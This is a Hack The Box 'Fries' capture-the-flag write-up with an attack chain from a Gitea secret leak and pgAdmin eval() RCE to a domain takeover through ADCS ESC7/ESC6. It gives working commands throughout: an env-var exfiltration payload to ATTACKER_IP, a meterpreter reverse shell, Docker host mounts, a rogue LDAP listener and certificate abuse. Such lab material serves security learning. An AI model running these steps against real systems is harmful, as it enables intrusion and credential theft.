# HTB Fries Writeup

## Machine Overview

**Fries** is a Hard-rated machine with one of the deepest attack chains on the platform — spanning Docker containers, NFS abuse, Docker TLS authz-broker identity spoofing, Active Directory pivoting via PWM password self-service, GMSA password extraction, and ADCS ESC6/ESC7 exploitation.

| Attribute | Value |
|-----------|-------|
| IP | 10.129.225.229 |
| Linux Host | web.fries.htb — Flask app, Docker, NFS |
| Windows DC | DC01.fries.htb — Windows Server 2019 |
| Vhosts | fries.htb, code.fries.htb, db-mgmt05.fries.htb, pwm.fries.htb:8443 |
| Docker API | 127.0.0.1:2376 (TLS + authz-broker) |
| ADCS | fries-DC01-CA (ESC6 + ESC7) |

**Attack chain:** Gitea git history leak → pgAdmin CVE-2025-2945 RCE → env var credential → SSH as svc → NFS + GID abuse → Docker TLS cert theft → authz-broker CN bypass → PwmConfiguration.xml → PWM LDAP redirect → svc_infra creds → ReadGMSAPassword → gMSA_CA_prod$ NTLM → ESC7 enable ESC6 → cert with Admin UPN → LDAP Schannel auth → change Admin password → root.

---

## Reconnaissance & Credential Discovery

### Virtual Host Enumeration

The target hosts multiple virtual hosts behind nginx on port 80. All are added to `/etc/hosts` for resolution.

```bash
# /etc/hosts
10.129.225.229 fries.htb DC01.fries.htb dc01.fries.htb pwm.fries.htb code.fries.htb db-mgmt05.fries.htb web.fries.htb
```

| Vhost | Service | Notes |
|-------|---------|-------|
| fries.htb | Flask app | Main company site |
| code.fries.htb | Gitea | Source code, initial creds provided |
| db-mgmt05.fries.htb | pgAdmin 4 v9.1.0 | CVE-2025-2945 target |
| pwm.fries.htb:8443 | PWM Password Self Service | LDAP proxy config |

### Gitea — Git History Credential Leak

Login to Gitea at `code.fries.htb` with provided credentials `dale:D4LE11maan!!`. The repository `dale/fries.htb` contains a Flask app. Reviewing git history with `git log -p` reveals a `.env` file that was deleted but is still present in the commit history — containing database credentials.

```bash
git clone 'http://dale:D4LE11maan%21%21@code.fries.htb/dale/fries.htb.git'
git log -p --all -- .env
```

**Credentials leaked from git history:**
```
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

> ⚠️ **Security Issue:** Deleting a file does not remove it from git history. Secrets committed to any branch remain permanently accessible unless the repository history is rewritten with `git filter-repo` or BFG Repo Cleaner.

---

## Foothold — CVE-2025-2945 pgAdmin RCE

### pgAdmin Authentication

pgAdmin 9.1.0 uses a React SPA that embeds a CSRF token in the initial page load. Authentication requires extracting this token before posting credentials.

```python
r = s.get(f"{TARGET}/login")
csrf = re.search(r'csrfToken":\s*"([\w+.-]+)"', r.text).group(1)

r = s.post(f"{TARGET}/authenticate/login", data={
    "csrf_token": csrf,
    "email":      "d.cooper@fries.htb",
    "password":   "D4LE11maan!!",
    "language":   "en",
    "internal_button": "Login"
}, allow_redirects=True)
```

### CVE-2025-2945 — Python eval() Injection

CVE-2025-2945 affects pgAdmin ≤ 9.1.0. The `query_commited` parameter of the SQL editor's download endpoint is passed directly to Python's `eval()`, enabling arbitrary code execution within the pgAdmin container.

```metasploit
use exploit/multi/http/pgadmin_query_tool_authenticated
set RHOSTS    db-mgmt05.fries.htb
set USERNAME  d.cooper@fries.htb
set PASSWORD  D4LE11maan!!
set DB_NAME   postgres
set DB_USER   root
set DB_PASS   PsqLR00tpaSS11
set PAYLOAD   python/meterpreter/reverse_tcp
exploit
```

Manual exploitation flow: authenticate → find server ID via `/sqleditor/get_server_connection/{sgid}/{sid}` → initialize editor → POST payload to `/sqleditor/query_tool/download/{trans_id}`.

### Exfiltrate pgAdmin Container Environment Variables

The pgAdmin container's environment variables contain the service account password. With `nopsycopg2` available for SQL-based exfil, the payload uses an HTTP callback to ship base64-encoded env vars to the attacker.

```python
# eval() payload
import os, urllib.request, base64
env_str = chr(10).join(f'{k}={v}' for k,v in os.environ.items())
b64 = base64.b64encode(env_str.encode()).decode()
urllib.request.urlopen(f'http://ATTACKER_IP:9002/{b64}', timeout=5)
```

**Captured from env vars:**
```
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
```

### SQL Command Execution via COPY FROM PROGRAM

An additional code execution path exists through the legitimate pgAdmin SQL editor. PostgreSQL's `COPY FROM PROGRAM` executes OS commands as the postgres user inside the database container.

```sql
-- Execute arbitrary OS commands via PostgreSQL
DROP TABLE IF EXISTS cmd_out;
CREATE TABLE cmd_out(o text);
COPY cmd_out FROM PROGRAM 'id';
SELECT string_agg(o, chr(10)) FROM cmd_out;
```

> Executes as `postgres` user inside the PostgreSQL container at 172.18.0.3.

---

## Linux Privilege Escalation — NFS + Docker TLS

### SSH as svc — Password Reuse

The `PGADMIN_DEFAULT_PASSWORD` is reused for the `svc` host account.

```bash
sshpass -p 'Friesf00Ds2025!!' ssh -o PreferredAuthentications=password svc@10.129.225.229
```

**Key host findings:**
- NFS export `/srv/web.fries.htb *(rw,no_subtree_check,insecure)`
- Docker TLS on 127.0.0.1:2376 with `--authorization-plugin=authz-broker`
- Docker certs at `/etc/docker/certs/` readable only by GID 59605603

### NFS Certificate Extraction via SSH Tunnel + GID Abuse

The NFS share is not accessible externally. An SSH port-forward tunnels port 2049 to the attacker. The `certs` directory inside the share is owned by GID 59605603 (`infra_managers`). Creating a local group with that GID allows accessing the files without any extra privileges — NFS v4 honours the numeric GID.

```bash
# Tunnel NFS port over SSH
ssh -L 2049:127.0.0.1:2049 -N svc@10.129.225.229

# Mount the NFS share
sudo mount -t nfs4 localhost:/srv/web.fries.htb /mnt/fries_nfs -o port=2049

# Create matching GID and access certs
sudo groupadd -g 59605603 infra_managers
sudo usermod -aG infra_managers kali
sudo bash -c 'sg infra_managers -c "cp /mnt/fries_nfs/certs/* /tmp/certs/"'
```

**Docker TLS certificates retrieved:** `ca.pem`, `ca-key.pem`, `server-cert.pem`, `server-key.pem` — the CA key allows signing arbitrary client certificates.

### Docker authz-broker Bypass via CN Impersonation

The authz-broker plugin determines the Docker user's identity from the Common Name (CN) of the client TLS certificate. Since we have the CA key, we can mint client certificates with any CN — including `sysadm` (readonly container access) and `root` (full access).

```bash
# Forge sysadm client certificate
openssl genrsa -out sysadm-key.pem 4096
openssl req -new -key sysadm-key.pem -out sysadm.csr -subj '/CN=sysadm'
openssl x509 -req -in sysadm.csr -CA ca.pem -CAkey ca-key.pem \
  -CAcreateserial -out sysadm-cert.pem -days 365 -sha256

# Forge root client certificate
openssl genrsa -out root-key.pem 4096
openssl req -new -key root-key.pem -out root.csr -subj '/CN=root'
openssl x509 -req -in root.csr -CA ca.pem -CAkey ca-key.pem \
  -CAcreateserial -out root-cert.pem -days 365 -sha256
```

> ⚠️ **Security Issue:** Using the TLS certificate CN as a trust boundary is insecure when the CA private key is accessible. Any holder of the CA key can forge any identity.

```bash
DOCKER="docker --tlsverify --tlscacert=ca.pem --tlscert=root-cert.pem --tlskey=root-key.pem -H=127.0.0.1:2376"

# List containers as root identity
$DOCKER ps
```

| Container | Image | IP |
|-----------|-------|-----|
| pwm | pwm/pwm-webapp:latest | 172.18.0.6 |
| pgadmin4 | dpage/pgadmin4:9.1.0 | 172.18.0.4 |
| web | fries-web | 172.18.0.2 |
| postgres | postgres:16 | 172.18.0.3 |
| gitea | gitea/gitea:1.22.6 | 172.18.0.5 |

### Extract PwmConfiguration.xml + User Flag

Using the sysadm identity (readonly container access), copy the PWM configuration file for later exploitation. Using the root identity, mount the host filesystem inside a Gitea container to read the user flag via Docker GTFOBins.

```bash
# Extract PWM config (sysadm identity)
docker --tlsverify --tlscacert=ca.pem --tlscert=sysadm-cert.pem --tlskey=sysadm-key.pem \
  -H=127.0.0.1:2376 cp pwm:/config/PwmConfiguration.xml /tmp/PwmConfiguration.xml

# User flag via Docker GTFOBins (root identity — host filesystem mount)
docker --tlsverify --tlscacert=ca.pem --tlscert=root-cert.pem --tlskey=root-key.pem \
  -H=127.0.0.1:2376 run -v /:/host --rm gitea/gitea:1.22.6 cat /host/root/user.txt
```

---

## Active Directory Pivot — PWM → GMSA

### PWM Config Analysis + bcrypt Crack

The extracted `PwmConfiguration.xml` contains the config admin password as a bcrypt hash (cost factor 4 — very fast to crack), the LDAP proxy user DN, an encrypted LDAP proxy password, and notably `configIsEditable: true`.

```bash
echo '$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG' > pwm_hash.txt
john pwm_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**PWM config password cracked:** `rockon!`

```
LDAP Proxy User: CN=svc_infra,CN=Users,DC=fries,DC=htb
LDAP URL: ldaps://dc01.fries.htb:636
```

### LDAP Credential Capture via PWM Config Redirect

Rather than decrypting the LDAP proxy password in the XML, we redirect PWM to bind against an attacker-controlled LDAP listener. Modifying the LDAP URL to our IP and setting `configIsEditable=false` forces PWM into RUNNING mode — which triggers an LDAP bind on restart.

```bash
# 1. Modify XML: change LDAP URL + set configIsEditable=false
# ldaps://dc01.fries.htb:636 → ldap://ATTACKER_IP:389

# 2. Upload modified config and restart PWM (root Docker identity)
docker cp /tmp/PwmConfiguration.xml pwm:/config/PwmConfiguration.xml
docker restart pwm

# 3. Start LDAP listener
sudo nc -nlvkp 389 > /tmp/ldap_capture.txt 2>&1

# 4. Trigger LDAP bind via PWM login page
# Access pwm.fries.htb:8443/pwm and submit any login attempt
```

**LDAP bind captured:**
```
Bind DN: CN=svc_infra,CN=Users,DC=fries,DC=htb
Password: m6tneOMAh5p0wQ0d
```

### GMSA Password Extraction

BloodHound reveals that `svc_infra` holds `ReadGMSAPassword` rights over the `gMSA_CA_prod$` account. NetExec extracts the NTLM hash directly from LDAP.

```bash
# Validate svc_infra credentials
nxc smb 10.129.225.229 -u svc_infra -p 'm6tneOMAh5p0wQ0d' -d fries.htb
[+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d

# Extract GMSA password hash
nxc ldap 10.129.225.229 -u svc_infra -p 'm6tneOMAh5p0wQ0d' -d fries.htb --gmsa
```

**GMSA hash extracted:**
```
gMSA_CA_prod$  NTLM: 27e126bdd4ae61c18377c4f8dd42fa86
```

```bash
# Confirm WinRM access as gMSA_CA_prod$
nxc winrm 10.129.225.229 -u 'gMSA_CA_prod$' -H '27e126bdd4ae61c18377c4f8dd42fa86' -d fries.htb
[+] fries.htb\gMSA_CA_prod$:27e126bdd4ae61c18377c4f8dd42fa86 (Pwn3d!)
```

---

## Root — ADCS ESC7 → ESC6 → Schannel

### ADCS Enumeration — ESC7 Identified

Certipy identifies that `gMSA_CA_prod$` holds both `ManageCa` and `ManageCertificates` rights on `fries-DC01-CA` (ESC7). User Specified SAN is initially disabled. The User template is Schema Version 1 with no SID enforcement — and `StrongCertificateBindingEnforcement = 0` (compatibility mode) is already set.

```bash
certipy-ad find -u svc_infra -p 'm6tneOMAh5p0wQ0d' -dc-ip 10.129.225.229 \
  -target fries.htb -vulnerable -stdout
```

> **ESC7:** `gMSA_CA_prod$` has ManageCa + ManageCertificates on fries-DC01-CA. This grants the ability to add Officer rights and modify CA flags — including enabling the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (ESC6).

### ESC7 Step 1 — Add Officer Rights

```bash
certipy-ad ca -u 'gMSA_CA_prod$' -hashes ':27e126bdd4ae61c18377c4f8dd42fa86' \
  -dc-ip 10.129.225.229 -target 10.129.225.229 -ca 'fries-DC01-CA' \
  -add-officer 'gMSA_CA_prod$'
[*] Successfully added officer 'gMSA_CA_prod$' on 'fries-DC01-CA'
```

### ESC7 Step 2 — Enable EDITF_ATTRIBUTESUBJECTALTNAME2

Direct registry modification fails but the ICertAdmin COM interface can set CA configuration entries via `ManageCa` rights. From a WinRM session as `gMSA_CA_prod$`, OR the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (0x40000) into the current EditFlags value.

```powershell
# WinRM as gMSA_CA_prod$
$ca     = New-Object -ComObject CertificateAuthority.Admin.1
$config = "DC01.fries.htb\fries-DC01-CA"

# Read current EditFlags (0x11014e)
$currentFlags = $ca.GetConfigEntry($config,
  "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags")

# OR in EDITF_ATTRIBUTESUBJECTALTNAME2 (0x40000) → new value 0x15014e
$newFlags = $currentFlags -bor 0x40000
$ca.SetConfigEntry($config,
  "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $newFlags)

# Restart Certificate Services to apply
Restart-Service CertSvc -Force
```

> **Why EDITF_ATTRIBUTESUBJECTALTNAME2 matters:** With this flag enabled, any template allows the requester to specify an arbitrary Subject Alternative Name (SAN/UPN) — enabling certificate requests for any user, including Administrator.

### ESC6 — Request Certificate as Administrator

With ESC6 enabled, use the Schema V1 `User` template (no SID enforcement) to request a certificate with `administrator@fries.htb` as the UPN in the SAN.

```bash
certipy-ad req -u svc_infra -p 'm6tneOMAh5p0wQ0d' -dc-ip 10.129.225.229 \
  -target 10.129.225.229 -ca 'fries-DC01-CA' -template User \
  -upn administrator@fries.htb
```

Output:
```
[*] Request ID is 68
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fries.htb'
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-3601'
[*] Saving certificate and private key to 'administrator.pfx'
```

> ⚠️ **SID mismatch:** The certificate contains `svc_infra`'s SID in the Security Extension, but the UPN is set to `administrator@fries.htb`. Standard PKINIT will fail with `KDC_ERR_CERTIFICATE_MISMATCH` — but LDAP Schannel does not enforce this check.

### LDAP Schannel Authentication — Bypass SID Check

Schannel/LDAPS authentication does not enforce the SID extension check performed by Kerberos PKINIT. Authenticating via LDAP with the certificate grants an Administrator-level LDAP session.

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.225.229 -ldap-shell
```

Output:
```
[*] Connecting to 'ldaps://10.129.225.229:636'
[*] Authenticated to '10.129.225.229' as: 'u:FRIES\Administrator'
Type help for list of commands
```

> **Why Schannel bypasses the check:** PKINIT (Kerberos) validates the `szOID_NTDS_CA_SECURITY_EXT` SID extension against the authenticating user. Schannel (TLS/LDAP) matches only on the UPN in the certificate's SAN — making it vulnerable to this cross-principal certificate abuse.

### Change Administrator Password → Root Flag

```powershell
# From the LDAP shell authenticated as Administrator
change_password administrator NewP@ssw0rd123!
Got User DN: CN=Administrator,CN=Users,DC=fries,DC=htb
Password changed successfully!
```

```bash
nxc winrm 10.129.225.229 -u Administrator -p 'NewP@ssw0rd123!' -d fries.htb \
  -X 'type C:\Users\Administrator\Desktop\root.txt'
```

---

## Attack Summary

| Step | Action | Result |
|------|--------|--------|
| 01 | Gitea git history — .env leak | DATABASE_URL: root:PsqLR00tpaSS11@172.18.0.3:5432 |
| 02 | pgAdmin CVE-2025-2945 — eval() RCE | Code execution in pgAdmin container |
| 03 | Exfiltrate env vars via HTTP callback | PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!! |
| 04 | SSH as svc (password reuse) | Shell on Linux host |
| 05 | NFS over SSH tunnel + GID 59605603 abuse | Docker TLS CA cert + CA key extracted |
| 06 | Forge sysadm + root TLS certs (CN abuse) | authz-broker bypassed — full Docker API access |
| 07 | docker cp PwmConfiguration.xml (sysadm) | LDAP proxy config + bcrypt hash extracted |
| 08 | Docker GTFOBins — host mount (root) | User Flag ✓ |
| 09 | John — crack PWM bcrypt → rockon! | PWM config admin access |
| 10 | PWM LDAP redirect → rogue listener | svc_infra : m6tneOMAh5p0wQ0d captured |
| 11 | nxc --gmsa → ReadGMSAPassword | gMSA_CA_prod$ NTLM: 27e126bdd4ae61c18377c4f8dd42fa86 |
| 12 | certipy ESC7 — add-officer + enable ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on CA |
| 13 | Request cert with UPN=administrator@fries.htb | administrator.pfx obtained (svc_infra SID, Admin UPN) |
| 14 | certipy auth -ldap-shell (Schannel bypass) | Authenticated as FRIES\Administrator via LDAP |
| 15 | change_password + nxc WinRM | Root Flag ✓ |

---

## Key Takeaways

### 01 — Git History Never Forgets
Deleting a file does not remove it from git history. Secrets committed at any point remain permanently accessible via `git log -p`. Use `git filter-repo` or BFG to purge history, and rotate all exposed secrets immediately.

### 02 — CVE-2025-2945 — pgAdmin eval() RCE
Passing user-controlled data to Python's `eval()` is an RCE vulnerability. pgAdmin ≤ 9.1.0 is vulnerable. Patch immediately and restrict pgAdmin to trusted networks with authentication enforced at the reverse-proxy level.

### 03 — Docker authz-broker CN Identity Forgery
Using the TLS certificate Common Name as an identity claim is only as secure as the CA private key. If the CA key is accessible (e.g., via NFS), any identity can be forged. The CA key must be protected with the same rigour as the Docker socket itself.

### 04 — NFS GID Abuse
NFS v3/v4 trusts the numeric GID provided by the client. An attacker who knows a target GID can create a matching local group and access files gated by that group — even across network mounts. Use Kerberos-backed NFS or restrict exports to specific client IPs.

### 05 — PWM LDAP Credential Exfiltration
PWM's configuration mode allows redirecting LDAP proxy credentials to an arbitrary server. Combined with a world-accessible config interface, this enables capturing plaintext LDAP service account passwords without decrypting the stored configuration.

### 06 — ADCS ESC6/ESC7 + Schannel SID Bypass
ManageCa rights enable enabling arbitrary SAN via ESC7→ESC6. Schema V1 templates lack SID enforcement. LDAP Schannel authentication does not validate the Security Extension SID — allowing a certificate issued to a low-priv user with an Admin UPN to authenticate as Administrator.

---

## Key Credentials

| Account | Credential | Type | Source |
|---------|------------|------|--------|
| dale | D4LE11maan!! | Password | Provided / Gitea login |
| postgres root | PsqLR00tpaSS11 | DB password | Git history .env |
| svc | Friesf00Ds2025!! | Password | pgAdmin env var (reuse) |
| svc_infra | m6tneOMAh5p0wQ0d | Password | PWM LDAP redirect |
| gMSA_CA_prod$ | 27e126bdd4ae61c18377c4f8dd42fa86 | NTLM hash | ReadGMSAPassword |
| Administrator | NewP@ssw0rd123! | Set via LDAP | ESC6/ESC7 + Schannel |
